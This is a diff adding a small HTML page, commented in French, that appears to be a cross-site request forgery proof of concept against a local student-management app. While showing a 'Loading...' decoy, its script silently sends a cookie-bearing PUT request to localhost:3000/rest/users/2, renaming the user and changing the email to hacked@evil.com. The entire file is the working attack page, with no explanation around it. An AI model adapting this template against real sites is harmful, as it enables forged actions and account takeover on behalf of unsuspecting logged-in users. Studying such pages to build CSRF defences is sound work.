@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<!--Cette page a pour objectif de modifier un étudiant existant avec un PUT via fetch js -->
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>😈 CSRF Attack – Edit Student</title>
+</head>
+<body>
+  <h1>Chargement en cours...</h1>
+  <script>
+  <!-- Étape 1 : soumission du PUT via fetch -->
+  fetch("http://localhost:3000/rest/users/2", {
+    method: "PUT",
+    credentials: "include", // essentiel pour envoyer les cookies
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      name: "Attaqué par CSRF PUT",
+      email: "hacked@evil.com"
+    })
+  });
+</script>
+</body>
+</html>
